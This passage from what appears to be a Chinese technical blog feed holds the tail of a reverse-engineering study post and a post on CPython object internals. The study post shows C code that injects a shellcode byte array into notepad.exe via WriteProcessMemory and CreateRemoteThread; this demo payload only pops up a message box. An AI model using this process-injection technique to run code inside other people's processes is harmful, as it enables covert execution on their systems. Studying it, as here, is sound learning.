%d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !(hThread = CreateRemoteThread(hProcess,  <span class="literal">NULL</span>, <span class="number">0</span>,                                    (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>],pRemoteBuf[<span class="number">0</span>],  <span class="number">0</span>, <span class="literal">NULL</span>)) )                     </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE); </span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>各位读者回想一下，关于<code>ThreadProc</code>的参数部分是一样的，但<code>ThreadProc</code>代码的主体部分在上节我们是怎么操作的？我们是在开辟出需要的空间（需要计算，<strong>这一点依赖于原代码的顺序在编译后顺序保持一致的特性</strong>，这带来了诸多不便，使得不通用）之后写入的内容也是依赖于这一点的。</p><p>在使用汇编字节码注入中，我们是这样进行的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( !WriteProcessMemory(hProcess, pRemoteBuf[<span class="number">1</span>], (LPVOID)&amp;g_InjectionCode,</span><br><span class="line">                            <span class="keyword">sizeof</span>(g_InjectionCode), <span class="literal">NULL</span>) ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory() fail : err_code = %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>g_InjectionCode</code>是字节码部分，在CodeInject2源码中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BYTE g_InjectionCode[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>, <span class="number">0x75</span>, <span class="number">0x08</span>, <span class="number">0x68</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x2E</span>, <span class="number">0x64</span>, <span class="number">0x68</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x54</span>, <span class="number">0xFF</span>, <span class="number">0x16</span>, <span class="number">0x68</span>, <span class="number">0x6F</span>, <span class="number">0x78</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x68</span>,</span><br><span class="line">    <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x4D</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0xFF</span>, <span class="number">0x56</span>, <span class="number">0x04</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0xE8</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x52</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x43</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0xE8</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x77</span>,</span><br><span class="line">    <span class="number">0x77</span>, <span class="number">0x2E</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x63</span>,</span><br><span class="line">    <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x2E</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x33</span>, <span class="number">0xC0</span>, <span class="number">0x8B</span>, <span class="number">0xE5</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，写入的size大小是独立计算的，写入的代码也是独立的。（不需要依赖于编译后代码先后顺序与源代码一致的特性）。</p><p>启动CodeInject2.exe并输入notepad.exe的PID，后续都是自动完成的。</p><h4 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h4><p>本节关于参数设定，由两个很有趣的点值的学习，一个是通过push入栈，结束了将当前栈顶地址保存出来。</p><p>第二个是使用call完成参数的设置。</p>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python源码剖析No.3--python中一切皆对象</title>
      <link href="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/"/>
      <url>/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<p>面向对象理论中“类”和“对象”这两个重要概念在python中均以对象的形式存在。</p><p>“类”是一种对象，称为类型对象；“类”实例化出来的“对象”也是对象，称为实例对象。根据上节的分析，可以根据对象的特点进一步划分：</p><img src="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/1.png" class=""><p>所以对象在python长得什么“妖怪模样”？</p><blockquote><p>由于python是由C语言实现的，因此python对象在C语言层面应该是一个结构体。不同类型的对象，数据以及行为均可能存在差异，这是对象的个性，对象也是存在一些共性的，比如每个对象都需要有一个引用计数，用于实现垃圾回收机制。</p><p>关于对象的具体模样，需要在源码中一窥究竟</p></blockquote><p><a href="https://docs.python.org/zh-cn/3.7/reference/datamodel.html#objects-values-and-types">python doc about object</a></p><h4 id="PyObject，对象的基石"><a href="#PyObject，对象的基石" class="headerlink" title="PyObject，对象的基石"></a>PyObject，对象的基石</h4><p>在python内部，<strong>定长对象</strong>都是由PyObject结构体表示，对象引用则是利用指针 PyObject * 。关于PyObject结构体的定义</p><p>位于源码位置&#x2F;include&#x2F;object.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Nothing is actually declared to be a PyObject, but every pointer to</span></span><br><span class="line"><span class="comment"> * a Python object can be cast to a PyObject*.  This is inheritance built</span></span><br><span class="line"><span class="comment"> * by hand.  Similarly every pointer to a variable-size Python object can,</span></span><br><span class="line"><span class="comment"> * in addition, be cast to PyVarObject*.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_object</span> &#123;</span><br><span class="line">    _PyObject_HEAD_EXTRA</span><br><span class="line">    Py_ssize_t ob_refcnt;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_typeobject</span> *ob_type;</span><br><span class="line">&#125; PyObject;</span><br></pre></td></tr></table></figure><p>PyObject结构体的成员有三：</p><ol><li><p>宏定义_PyObject_HEAD_EXTRA</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> Py_TRACE_REFS</span></span><br><span class="line"><span class="comment">/* Define pointers to support a doubly-linked list of all live heap objects. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PyObject_HEAD_EXTRA            \</span></span><br><span class="line"><span class="meta">    struct _object *_ob_next;           \</span></span><br><span class="line"><span class="meta">    struct _object *_ob_prev;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PyObject_EXTRA_INIT 0, 0,</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PyObject_HEAD_EXTRA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PyObject_EXTRA_INIT</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p> 若Py_TRACE_REFS有定义，则宏_PyObject_HEAD_EXTRA展开为两个_object指针，注释：这两个指针构成双向链表由于串起所有堆中活跃对象，<strong>一般不启用，不做过多介绍</strong></p></li><li><p>引用计数（ob_refcnt）</p><p> 当对象在其他位置被引用，该值+1，在某处引用解除，该值-1，当引用计数 &#x3D; 0，则由回收机制进行资源回收。</p></li><li><p>类型指针（ob_type）</p><p> 指明当前对象所属的类型，由此指向的类型决定当前对象的描述，数据，以及对象可进行的操作</p></li></ol><p><strong>变长对象</strong>是在定长对象PyObject基础上扩充的PyVarObject定义（&#x2F;include&#x2F;object.h）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    PyObject ob_base;</span><br><span class="line">    Py_ssize_t ob_size; <span class="comment">/* Number of items in variable part */</span></span><br><span class="line">&#125; PyVarObject;</span><br></pre></td></tr></table></figure><p>结构体PyVarObject成员有二：</p><ol><li>第一个成员ob_base是上文提及的PyObject类型</li><li>相比PyObject多了一个成员ob_size，用于说明串联的元素个数ob_size，比如int类型，需要串联几个32位整型进行数值表达</li></ol><img src="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/2.png" class=""><p>python根据对象的特点（是否定长）的需要来包含相应的头部PyObject 、 PyVarObject。为此，为这两个头部准备了宏定义，方便其他对象使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PyObject_HEAD          PyObject ob_base;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PyObject_VAR_HEAD      PyVarObject ob_base;</span></span><br></pre></td></tr></table></figure><h5 id="定长对象举例–float"><a href="#定长对象举例–float" class="headerlink" title="定长对象举例–float"></a>定长对象举例–float</h5><p>对于定长对象 float对应的结构体PyFloatObject（定义位置：&#x2F;include&#x2F;floatobject.h）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    <span class="type">double</span> ob_fval;</span><br><span class="line">&#125; PyFloatObject;</span><br></pre></td></tr></table></figure><img src="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/3.png" class=""><h5 id="变长对象举例–list"><a href="#变长对象举例–list" class="headerlink" title="变长对象举例–list"></a>变长对象举例–list</h5><p>变长对象list对应的结构体PyListObject（定义位置：&#x2F;include&#x2F;listobject.h）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> Py_LIMITED_API</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    <span class="comment">/* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */</span></span><br><span class="line">    PyObject **ob_item;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ob_item contains space for &#x27;allocated&#x27; elements.  The number</span></span><br><span class="line"><span class="comment">     * currently in use is ob_size.</span></span><br><span class="line"><span class="comment">     * Invariants:</span></span><br><span class="line"><span class="comment">     *     0 &lt;= ob_size &lt;= allocated</span></span><br><span class="line"><span class="comment">     *     len(list) == ob_size</span></span><br><span class="line"><span class="comment">     *     ob_item == NULL implies ob_size == allocated == 0</span></span><br><span class="line"><span class="comment">     * list.sort() temporarily sets allocated to -1 to detect mutations.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Items must normally not be NULL, except during construction when</span></span><br><span class="line"><span class="comment">     * the list is not yet visible outside the function that builds it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Py_ssize_t allocated;</span><br><span class="line">&#125; PyListObject;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>根据注释内容对ob_item的描述，ob_item包含的空间是<code>&#39;allocated&#39; elements</code> 而<code>allocated element</code>中已使用的部分由<code>ob_size</code>进行描述，ob_size的位置是可变对象头部PyObject_VAR_HEAD中的字段，这里再贴一遍PyObject_VAR_HEAD的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject ob_base;</span><br><span class="line">    Py_ssize_t ob_size; <span class="comment">/* Number of items in variable part */</span></span><br><span class="line">&#125; PyVarObject;</span><br></pre></td></tr></table></figure><p>因此，对于变长对象list的示意图：</p><img src="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/4.png" class=""><p>可以看到，对于变长对象list而言，在结构体中会设置分配的空间allocated大小，随后若list空间不足需求，会有相应的扩充方法，这部分后续学习到list源码在做补充吧。</p><hr><h5 id="对象头部的初始化"><a href="#对象头部的初始化" class="headerlink" title="对象头部的初始化"></a>对象头部的初始化</h5><p>python为了方便对对象头部初始化做了相关宏定义，这里做下拆解进行说明</p><h6 id="对于定长对象"><a href="#对于定长对象" class="headerlink" title="对于定长对象"></a>对于定长对象</h6><p>代码位置（&#x2F;include&#x2F;object.h）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PyObject_HEAD_INIT(type)        \</span></span><br><span class="line"><span class="meta">    &#123; _PyObject_EXTRA_INIT              \</span></span><br><span class="line"><span class="meta">    1, type &#125;,</span></span><br></pre></td></tr></table></figure><p>PyObject_HEAD_INIT一般用于定长对象头部初始化，对于定长对象头部：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> &#123;</span></span><br><span class="line">    _PyObject_HEAD_EXTRA</span><br><span class="line">    Py_ssize_t ob_refcnt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">ob_type</span>;</span></span><br><span class="line">&#125; PyObject;</span><br></pre></td></tr></table></figure><p>可以看到初始化操作设置_PyObject_HEAD_EXTRA使用宏_PyObject_EXTRA_INIT 由于_PyObject_HEAD_EXTRA一般不启用，不做深究。</p><p>接着设置定长对象的引用计数 &#x3D; 1，并根据定长对象的类型完成ob_type类型的设置。</p><h6 id="变长对象"><a href="#变长对象" class="headerlink" title="变长对象"></a>变长对象</h6><p>接着看变长对象初始化做了什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PyVarObject_HEAD_INIT(type, size)       \</span></span><br><span class="line"><span class="meta">    &#123; PyObject_HEAD_INIT(type) size &#125;,</span></span><br></pre></td></tr></table></figure><p>同样的，这里再po一遍<strong>变长对象</strong>头部：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject ob_base;</span><br><span class="line">    Py_ssize_t ob_size; <span class="comment">/* Number of items in variable part */</span></span><br><span class="line">&#125; PyVarObject;</span><br></pre></td></tr></table></figure><p>ob_base前文提到是定长对象头部的宏定义来的，为了方便引用。相比定长对象头部，只是多了一个成员ob_size。</p><p>对于变长对象头部中的定长对象头部，做的初始化和定长对象头部初始化一致，设置对象引用计数 &#x3D; 1，完成对象类型ob_type的设置，最后对变长对象头部独有的长度size设置。</p><hr><h4 id="PyTypeObject，类型对象的基石"><a href="#PyTypeObject，类型对象的基石" class="headerlink" title="PyTypeObject，类型对象的基石"></a>PyTypeObject，类型对象的基石</h4><p>这部分关乎上文提到的PyObject（PyVarObject）头部中的type类型设置。</p><p>经过上述PyObject对象相关学习，知道对于对象头中一些字段是所有对象共有的，引用计数、类型指针..也有一些值区别字段，比如变长对象中指示元素格式的ob_size</p><p>目前对于python对象经过前面的学习，知道了int和 list二者都是变长对象，先看下面代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = []</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(a))</span><br><span class="line"></span><br><span class="line">b = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(b))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------output--------------#</span></span><br><span class="line"><span class="number">56</span></span><br><span class="line"><span class="number">28</span></span><br></pre></td></tr></table></figure><p>可以看到，同为变长对象的int list二者在分配内存有所差异的，再比如对于list对象，我们可以使用append追加元素的函数，而对于int类型则不行，也就是创建对象初始化时做的比我们想的要多，那么依据又是什么呢？ –答案已经显而易见的，根据实际创建的对象所对应的类型而言，我们注意到在对象头部初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PyObject_HEAD_INIT(type)        \</span></span><br><span class="line"><span class="meta">    &#123; _PyObject_EXTRA_INIT              \</span></span><br><span class="line"><span class="meta">    1, type &#125;,<span class="comment">//关键在于type</span></span></span><br></pre></td></tr></table></figure><p>顺藤摸瓜，找到PyObject头部中查看type对应的结构体：**_typeobject**</p><p>找到定义的位置（&#x2F;Doc&#x2F;includes&#x2F;typestruct.h）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *tp_name; <span class="comment">/* For printing, in format &quot;&lt;module&gt;.&lt;name&gt;&quot; */</span></span><br><span class="line">    Py_ssize_t tp_basicsize, tp_itemsize; <span class="comment">/* For allocation */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Methods to implement standard operations */</span></span><br><span class="line"></span><br><span class="line">    destructor tp_dealloc;</span><br><span class="line">    printfunc tp_print;</span><br><span class="line">    getattrfunc tp_getattr;</span><br><span class="line">    setattrfunc tp_setattr;</span><br><span class="line">    PyAsyncMethods *tp_as_async; <span class="comment">/* formerly known as tp_compare (Python 2)</span></span><br><span class="line"><span class="comment">                                    or tp_reserved (Python 3) */</span></span><br><span class="line">    reprfunc tp_repr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Method suites for standard classes */</span></span><br><span class="line"></span><br><span class="line">    PyNumberMethods *tp_as_number;</span><br><span class="line">    PySequenceMethods *tp_as_sequence;</span><br><span class="line">    PyMappingMethods *tp_as_mapping;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* More standard operations (here for binary compatibility) */</span></span><br><span class="line"></span><br><span class="line">    hashfunc tp_hash;</span><br><span class="line">    ternaryfunc tp_call;</span><br><span class="line">    reprfunc tp_str;</span><br><span class="line">    getattrofunc tp_getattro;</span><br><span class="line">    setattrofunc tp_setattro;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Functions to access object as input/output buffer */</span></span><br><span class="line">    PyBufferProcs *tp_as_buffer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags to define presence of optional/expanded features */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> tp_flags;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *tp_doc; <span class="comment">/* Documentation string */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* call function for all accessible objects */</span></span><br><span class="line">    traverseproc tp_traverse;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* delete references to contained objects */</span></span><br><span class="line">    inquiry tp_clear;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* rich comparisons */</span></span><br><span class="line">    richcmpfunc tp_richcompare;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* weak reference enabler */</span></span><br><span class="line">    Py_ssize_t tp_weaklistoffset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Iterators */</span></span><br><span class="line">    getiterfunc tp_iter;</span><br><span class="line">    iternextfunc tp_iternext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Attribute descriptor and subclassing stuff */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PyMethodDef</span> *<span class="title">tp_methods</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PyMemberDef</span> *<span class="title">tp_members</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PyGetSetDef</span> *<span class="title">tp_getset</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">tp_base</span>;</span></span><br><span class="line">    PyObject *tp_dict;</span><br><span class="line">    descrgetfunc tp_descr_get;</span><br><span class="line">    descrsetfunc tp_descr_set;</span><br><span class="line">    Py_ssize_t tp_dictoffset;</span><br><span class="line">    initproc tp_init;</span><br><span class="line">    allocfunc tp_alloc;</span><br><span class="line">    newfunc tp_new;</span><br><span class="line">    freefunc tp_free; <span class="comment">/* Low-level free-memory routine */</span></span><br><span class="line">    inquiry tp_is_gc; <span class="comment">/* For PyObject_IS_GC */</span></span><br><span class="line">    PyObject *tp_bases;</span><br><span class="line">    PyObject *tp_mro; <span class="comment">/* method resolution order */</span></span><br><span class="line">    PyObject *tp_cache;</span><br><span class="line">    PyObject *tp_subclasses;</span><br><span class="line">    PyObject *tp_weaklist;</span><br><span class="line">    destructor tp_del;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Type attribute cache version tag. Added in version 2.6 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_version_tag;</span><br><span class="line"></span><br><span class="line">    destructor tp_finalize;</span><br><span class="line"></span><br><span class="line">&#125; PyTypeObject;</span><br></pre></td></tr></table></figure><p>从结构体的定义来看，关键信息在于：</p><ul><li>PyTypeObject第一个成员为PyObject_VAR_HEAD，可见PyTypeObject是一个变长对象</li><li>tp_name成员，类型名称，可用于打印需要</li><li>事关内存分配的 tp_basicsize, tp_itemsize</li><li>类型的继承信息，例如tp_base指向基类对象</li><li>类型的子类信息，tp_subclasses</li><li>类型允许的操作信息：descrgetfunc tp_descr_get;等等</li></ul><p><strong>PyTypeObject</strong>类型就是类型对象在python中的表现形式，对应着面向对象中“类”的概念 </p><h5 id="PyList-Type"><a href="#PyList-Type" class="headerlink" title="PyList_Type"></a>PyList_Type</h5><p>实例进行探讨，以list类型为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(var))</span><br><span class="line">var.append(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">var</span><br><span class="line">var2 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(var2))</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------output------------#</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>list</strong>为列表类型对象，在系统中只有唯一一个，保存着所有列表实例出来的实例对象的元信息（<strong>共性部分</strong>）。</p><img src="/2022/05/06/python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-python%E4%B8%AD%E4%B8%80%E5%88%87%E7%9A%86%E5%AF%B9%E8%B1%A1/5.png" 